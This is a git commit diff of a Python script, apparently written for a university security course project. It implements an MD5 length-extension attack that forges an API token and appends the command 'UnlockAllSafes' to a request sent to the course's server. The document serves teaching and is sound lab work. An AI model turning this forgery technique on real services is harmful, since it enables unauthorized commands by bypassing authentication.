3a900026cb222a8a87903c47463b0a88cfa64a58
Gaurav  Vyas <gauravvyas@Gauravs-MacBook-Air.local>
2017-01-15 18:13:50 -0500

    1.1: Generalized length extension

--- length_extension.py
+++ length_extension.py
@@ -1,19 +1,38 @@
 import httplib, urlparse, sys
 from pymd5 import md5, padding
+import urllib
 #url = sys.argv[1]
 
 # Your code to modify url goes here
 
 url = 'https://eecs388.org/project1/api?token=402a574d265dc212ee64970f159575d0&user=admin&command1=ListFiles&command2=NoOp'
 parsedURL = urlparse.urlparse(url)
+
+
+dict =  urlparse.parse_qs(parsedURL.query)
+
+#print parsedURL.scheme
 token = urlparse.parse_qs(parsedURL.query)['token'][0]
+end_url = "&user="+dict['user'][0]+"&command1="+dict['command1'][0]+"&command2="+dict['command2'][0]
+begin_url = parsedURL.scheme+"://"+ parsedURL.netloc + parsedURL.path+"?token="
 
-print token
+length_of_m = (len(end_url) + 7)
 
+bits = (length_of_m + len(padding(length_of_m*8)))*8
+
+h = md5(state = token.decode("hex"), count = bits)
+x = "&command3=UnlockAllSafes"
+h.update(x)
+
+url = begin_url+h.hexdigest()+end_url+urllib.quote(padding(length_of_m*8))+x
 
 #url = 'https://eecs388.org/project1/api?token=acc711db59ca4e60872e9afd9466cdc7&user=admin&command1=ListFiles&command2=NoOp'
-#parsedUrl = urlparse.urlparse(url)
+parsedUrl = urlparse.urlparse(url)
 
-#conn = httplib.HTTPSConnection(parsedUrl.hostname,parsedUrl.port)
-#conn.request("GET", parsedUrl.path + "?" + parsedUrl.query)
-#print conn.getresponse().read()
+conn = httplib.HTTPSConnection(parsedUrl.hostname,parsedUrl.port)
+conn.request("GET", parsedUrl.path + "?" + parsedUrl.query)
+print conn.getresponse().read()
+
+
+
+
